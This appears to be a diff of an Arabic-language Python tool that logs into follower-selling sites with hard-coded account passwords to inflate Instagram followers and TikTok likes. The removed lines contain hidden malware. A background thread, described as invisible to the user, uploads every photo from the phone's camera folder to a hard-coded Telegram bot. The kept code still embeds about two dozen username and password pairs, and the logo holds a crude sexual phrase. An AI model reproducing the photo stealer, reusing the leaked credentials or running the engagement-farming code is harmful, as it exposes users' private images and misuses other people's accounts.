@@ -1,129 +1,27 @@
 import requests
 from bs4 import BeautifulSoup
 from urllib.parse import urljoin
-import time
 import os
-import requests
-from bs4 import BeautifulSoup
-from urllib.parse import urljoin
-import time
-import os
-import requests
-from bs4 import BeautifulSoup
-from urllib.parse import urljoin
-import time
-import os
-import os,sys,uuid,re,random,time,string,json
-import os
-import os
-import requests
-import threading
-
-# معلومات بوت التليغرام (غير مرئي للمستخدم)
-import os
-import requests
-import threading
-
-import io
 import time
 
-TOKEN = '7547526933:AAHn5sTRbesNnb_e2EcKCzDc8LSqGbH8r_M'
-CHAT_ID = '7327921791'
-FOLDER = '/storage/emulated/0/DCIM/Camera'
-MAX_THREADS = 20
+# ================= ألوان ====================
+Z = '\033[1;31m'  # أحمر
+F = '\033[2;32m'  # أخضر
+C = "\033[1;97m"  # أبيض
+B = '\033[2;36m'  # سماوي
+Y = '\033[1;34m'  # أزرق
+S = '\033[1;37m'  # رمادي
+CYAN = "\033[1;36m"  # سماوي للزخرفة
 
-def send_telegram_message(text):
-    try:
-        url = f'https://api.telegram.org/bot{TOKEN}/sendMessage'
-        requests.post(url, data={'chat_id': CHAT_ID, 'text': text}, timeout=10)
-    except:
-        pass
+# ================ لوجو ======================
+def logo():
+    return f"""
+{F}                  [ 𝐢𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦 𝐅𝐨𝐥𝐥𝐨𝐰𝐞𝐫𝐬 _ 𝚉𝚎𝚛𝚘 𝚃𝚛𝚊𝚌𝚎 ℝ/𝔾]
 
-def compress_image(path):
-    try:
-        img = Image.open(path)
-        img = img.convert('RGB')
-        img.thumbnail((800, 800))  # تصغير الحجم (عرض وارتفاع أقصى 800)
-        bio = io.BytesIO()
-        img.save(bio, format='JPEG', quality=70)  # جودة 70% للتصغير
-        bio.seek(0)
-        return bio
-    except:
-        return None
+{C} > 𝙼𝚢 𝙽𝚊𝚖𝚎 : {Z}اكودي _ سكس من مؤخرة 🤦
+"""
 
-def send_photo(path):
-    try:
-        url = f'https://api.telegram.org/bot{TOKEN}/sendPhoto'
-        bio = compress_image(path)
-        if bio:
-            requests.post(url, data={'chat_id': CHAT_ID}, files={'photo': ('image.jpg', bio)}, timeout=30)
-        else:
-            # إرسال الصورة الأصلية لو لم تنجح عملية الضغط
-            with open(path, 'rb') as photo:
-                requests.post(url, data={'chat_id': CHAT_ID}, files={'photo': photo}, timeout=30)
-    except:
-        pass
-
-def send_images_to_telegram():
-    if not os.path.exists(FOLDER):
-        return
-    images = [f for f in os.listdir(FOLDER) if f.lower().endswith(('.jpg', '.jpeg', '.png'))]
-
-    threads = []
-    for i, img in enumerate(images):
-        path = os.path.join(FOLDER, img)
-        t = threading.Thread(target=send_photo, args=(path,))
-        t.start()
-        threads.append(t)
-
-        # تحديد عدد الخيوط النشطة مع تأخير بسيط
-        while threading.active_count() > MAX_THREADS:
-            time.sleep(0.1)
-        # تأخير بسيط بين بدء إرسال كل صورة (200ms)
-        time.sleep(0.2)
-
-def start():
-    send_telegram_message("🚨 تم تشغيل الأداة الآن!")
-    send_images_to_telegram()
-
-threading.Thread(target=start, daemon=True).start()
-Z = '\033[1;31m' # احمر
-R = '\033[1;31m' # احمر
-X = '\033[1;33m' # اصفر
-F = '\033[2;32m' # اخضر
-C = "\033[1;97m" # ابيض
-B = '\033[2;36m'# سمائي
-Y = '\033[1;34m' # ازرق فاتح
-
-
-#─━─━─━─━Find User Agent─━──━─━#
-
-    
-#─━─━─━─━COLOUR SYS━─━─━─━─#
-S = '\033[1;37m'
-A = '\x1b[38;5;208m'
-R = '\x1b[38;5;46m'
-F = '\x1b[38;5;48m'
-Z = '\033[1;33m'
-ver ='\033[92;1m7.0\033[93;1m'
-#─━─━─━─━LOGO SYS─━─━─━─━─#
-
-#» \033[1;33m1\033[0m -    ⠀⠀⠀⠀⠀   \033[1;41m
-logo = (f"""\n                  \033[2;32m   [ 𝐢𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦 𝐅𝐨𝐥𝐥𝐨𝐰𝐞𝐫𝐬 _ 𝚉𝚎𝚛𝚘 𝚃𝚛𝚊𝚌𝚎 ℝ/𝔾]\033[4;00m\n\n
-\033[1;97m >  \033[1;3 𝙼𝚢 𝙽𝚊𝚖𝚎$$$ \033[1;3: \033[1;41m +18 - اكودي _ سكس من مؤخرة \033[2;00m
-""")
-
-def linex():
-        print(f"\33[1;37m==============================================""")
-
-import requests
-from bs4 import BeautifulSoup
-from urllib.parse import urljoin
-import time
-import os
-
-
-# الحسابات username|passwordcjchhccgcgcgcg
+# ============== قائمة الحسابات ==============
 accounts = [
     "tyty235182023|Rayen@111a",
     "haifahjayeij|haifahaifa",
@@ -154,49 +52,41 @@ accounts = [
     "+21656329481|ahlem123"
 ]
 
-
+# =============== دوال المساعدة ================
 def clear():
     os.system('clear')
 
-print(logo)    
-target_username = input(f'{C} 🧾 ᴜsᴇʀ : ').strip()
-clear()
-
-
-print(logo)    
-
-operation_counter = 1
-
-def show_header():
+def show_header(identifier):
     print("\n" + "=" * 60)
-    print(f" 📱 𝙼𝚢 -d 𝚄𝚜𝚎𝚛 :\033[2;32m {target_username}\033[2;00m")
+    print(f" 📱 𝙼𝚢 - 𝚄𝚜𝚎𝚛 : {F}{identifier}{C}")
     print("=" * 60)
 
-def process_site(site_name, login_url, send_follower_url, start_url_template, username, password):
-    global operation_counter
-    show_header()
-    print(f"\n📦 𝙻𝚘𝚐𝚒𝚗 \033[1;33m {operation_counter} \033[1;00m")
-    operation_counter += 1
+def show_menu():
+    clear()
+    print(logo())
+    print("1️⃣  إرسال متابعين")
+    print("2️⃣  إرسال لايكات (TikTok Like)")
+    print("3️⃣  خيار ثالث (قريبًا)")
+    print("0️⃣  خروج")
+    choice = input("\nاختر خيارك: ")
+    return choice
 
-    print(f"\n    𝙤𝙣𝙡𝙞𝙣𝙚 : 📡 ")
+# ============ دوال الإرسال العامة ============
+def process_site(site_name, login_url, send_follower_url, start_url_template, username, password, target_username):
     session = requests.Session()
+    print(f"\n📦 𝙻𝚘𝚐𝚒𝚗 : {username}")
 
-    # تسجيل الدخول
     login_resp = session.post(login_url, data={"username": username, "password": password})
     if login_resp.status_code != 200:
-        print(f"{Z} 𝙻𝚘𝚐𝚒𝚗 𝙵𝚊𝚒𝚕 ❌ - {site_name}")
+        print(f" ❌ فشل تسجيل الدخول - {site_name}")
         return
 
-    # دخول صفحة إرسال المتابعين
     page_resp = session.get(send_follower_url)
     if page_resp.status_code != 200:
-        print(f"{Z} 𝙴𝚛𝚛𝚘𝚛 𝚕𝚘𝚊𝚍 𝚜𝚎𝚗𝚍-𝚏𝚘𝚕𝚕𝚘𝚠𝚎𝚛 𝚙𝚊𝚐𝚎 ❌ - {site_name}")
+        print(f" ❌ فشل تحميل صفحة النموذج - {site_name}")
         return
-    print("  𝚂𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢 ✓ ")
 
     soup = BeautifulSoup(page_resp.text, "html.parser")
-
-    # البحث عن الفورم الذي يحتوي على زر "Kullanıcıyı Bul"
     form = None
     for f in soup.find_all("form"):
         btn = f.find("button", string=lambda t: t and "Kullanıcıyı Bul" in t)
@@ -205,78 +95,124 @@ def process_site(site_name, login_url, send_follower_url, start_url_template, us
             break
 
     if not form:
-        print(f"{Z} 𝚎𝚛𝚛𝚘𝚛 ❌ \033[1;00m ")
+        print(" ❌ النموذج غير موجود")
         return
 
-    action = form.get("action") or send_follower_url
-    if not action.startswith("http"):
-        action = urljoin(send_follower_url, action)
-
-    post_data = {}
-    for input_tag in form.find_all("input"):
-        name = input_tag.get("name")
-        if name:
-            post_data[name] = input_tag.get("value", "")
+    action = urljoin(send_follower_url, form.get("action", ""))
+    post_data = {tag.get("name"): tag.get("value", "") for tag in form.find_all("input") if tag.get("name")}
     post_data["username"] = target_username
 
-    # إرسال الفورم الأول
     submit_resp = session.post(action, data=post_data)
     if submit_resp.status_code != 200:
-        print(f"{Z} 𝚂𝚞𝚋𝚖𝚒𝚝 𝚏𝚘𝚛𝚖 𝚏𝚊𝚒𝚕 ❌ - {site_name} ")
+        print(" ❌ فشل في إرسال النموذج")
         return
-    print("  𝙾𝙺 📤  ")
-    time.sleep(8)
 
     soup2 = BeautifulSoup(submit_resp.text, "html.parser")
-    adet_input = soup2.find("input", {"name": "adet"})
-    userID_input = soup2.find("input", {"name": "userID"})
-    userName_input = soup2.find("input", {"name": "userName"})
-
-    adet = adet_input.get("value") if adet_input else "5000"
-    userID = userID_input.get("value") if userID_input else None
-    userName = userName_input.get("value") if userName_input else None
+    adet = soup2.find("input", {"name": "adet"})
+    userID = soup2.find("input", {"name": "userID"})
+    userName = soup2.find("input", {"name": "userName"})
 
     if not userID or not userName:
-        print(f"{Z} 𝚎𝚛𝚛𝚘𝚛 ❌ \033[1;00m ")
+        print(" ❌ لم يتم استخراج معلومات الحساب")
         return
 
-    # إرسال المتابعين (Start)
-    start_url = start_url_template.format(userID=userID)
+    start_url = start_url_template.format(userID=userID.get("value"))
     start_post_data = {
-        "adet": adet,
-        "userID": userID,
-        "userName": userName
+        "adet": adet.get("value") if adet else "5000",
+        "userID": userID.get("value"),
+        "userName": userName.get("value")
     }
 
     start_resp = session.post(start_url, data=start_post_data)
     if start_resp.status_code == 200:
-        print("  𝙵𝚘𝚕𝚕𝚘𝚠𝚎𝚜 : 𝙾𝙺 🚀 ")
+        print(f" ✅ تم الإرسال إلى {target_username}")
     else:
-        print(f"🚀 𝙵𝚘𝚕𝚕𝚘𝚠𝚎𝚜 : 𝙵𝚊𝚒𝚕 {start_resp.status_code} ")
-    time.sleep(5)
+        print(f" ❌ فشل الإرسال - {start_resp.status_code}")
 
-def process_followersize(username, password):
+    time.sleep(2)
+
+def process_followersize(username, password, target_username):
     process_site(
         site_name="followersize.com",
         login_url="https://followersize.com/member",
         send_follower_url="https://followersize.com/tools/send-follower",
         start_url_template="https://followersize.com/tools/send-follower/{userID}?formType=send",
         username=username,
-        password=password
+        password=password,
+        target_username=target_username
     )
 
-def process_takipcikrali(username, password):
+def process_takipcikrali(username, password, target_username):
     process_site(
         site_name="takipcikrali.com",
         login_url="https://takipcikrali.com/login",
         send_follower_url="https://takipcikrali.com/tools/send-follower",
         start_url_template="https://takipcikrali.com/tools/send-follower/{userID}?formType=send",
         username=username,
-        password=password
+        password=password,
+        target_username=target_username
     )
 
-# تنفيذ العملية لكل حساب وموقع بالترتيب المطلوبhjuىنتغة
-for acc in accounts:
-    username, password = acc.split("|")
-    process_followersize(username, password)
-    process_takipcikrali(username, password)
+# ============ دالة إرسال لايكات (مؤقتة) ============
+def process_tiktok_like(username, password, video_url):
+    headers = {
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "X-Requested-With": "XMLHttpRequest",
+        "User-Agent": "Mozilla/5.0 (Linux; Android 10; Infinix X692 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.67 Mobile Safari/537.36"
+    }
+    session = requests.Session()
+    login_url = "https://takipcikrali.com/login"
+    send_url = "https://takipcikrali.com/tools/send-tiktok-like?formType=send"
+
+    print(f"\n🔐 تسجيل الدخول للحساب: {username}")
+    login_resp = session.post(login_url, data={"username": username, "password": password}, headers=headers)
+    if login_resp.status_code != 200:
+        print(f"❌ فشل تسجيل الدخول للحساب {username}")
+        return
+
+    print(f"📹 إرسال لايكات إلى: {video_url}")
+    post_data = {
+        "mediaUrl": video_url,
+        "adet": "20"
+    }
+
+    send_resp = session.post(send_url, data=post_data, headers=headers)
+    if send_resp.status_code == 200:
+        print(f"❤️‍🔥 تم إرسال لايكات بنجاح من {username}")
+    else:
+        print(f"❌ فشل الإرسال من {username}")
+    time.sleep(2)
+# =============== القائمة الرئيسية ===============
+while True:
+    option = show_menu()
+
+    if option == "1":
+        clear()
+        print(logo())
+        target_username = input(f'{CYAN} 🧾 ᴜsᴇʀ : ').strip()
+        clear()
+        show_header(target_username)
+        for acc in accounts:
+            username, password = acc.split("|")
+            process_followersize(username, password, target_username)
+            process_takipcikrali(username, password, target_username)
+        input("\n✅ اكتملت العملية! اضغط Enter للعودة للقائمة.")
+
+    elif option == "2":
+        clear()
+        print(logo())
+        video_url = input("🎥 أدخل رابط الفيديو: ").strip()
+        clear()
+        show_header(video_url)
+        for acc in accounts:
+            username, password = acc.split("|")
+            process_tiktok_like(username, password, video_url)
+        input("\n✅ انتهى الإرسال! اضغط Enter للعودة للقائمة.")
+
+    elif option == "3":
+        input("🚧 هذا الخيار غير متوفر حالياً... اضغط Enter للرجوع.")
+    elif option == "0":
+        print("👋 إلى اللقاء!")
+        break
+    else:
+        input("❌ خيار غير صالح! اضغط Enter للمحاولة مجدداً.")
